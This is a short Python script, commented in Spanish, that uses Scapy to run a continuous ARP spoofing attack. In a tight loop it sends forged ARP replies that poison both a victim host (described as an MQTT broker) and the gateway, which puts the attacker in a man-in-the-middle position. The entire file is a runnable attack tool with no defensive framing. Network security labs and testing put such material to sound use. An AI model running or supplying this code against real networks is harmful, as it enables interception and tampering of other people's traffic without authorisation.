from scapy.all import ARP, Ether, send
import time

TARGET_IP = "10.0.2.15"     # IP de la víctima (Broker MQTT por ejemplo)
GATEWAY_IP = "10.0.2.1"     # IP del Gateway (Router)
ATTACKER_MAC = "de:ad:be:ef:00:01"  # MAC del atacante (opcional, Scapy detecta la real)

def arp_spoof(target_ip, spoof_ip):
    # Crear paquete ARP falsificado
    arp_response = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(arp_response, verbose=0)
    print(f"[+] Spoofed {target_ip} into thinking {spoof_ip} is at our MAC")

if __name__ == "__main__":
    try:
        while True:
            arp_spoof(TARGET_IP, GATEWAY_IP)
            arp_spoof(GATEWAY_IP, TARGET_IP)
            time.sleep(0.001)
    except KeyboardInterrupt:
        print("\n[!] Stopping ARP Spoofing...")
    
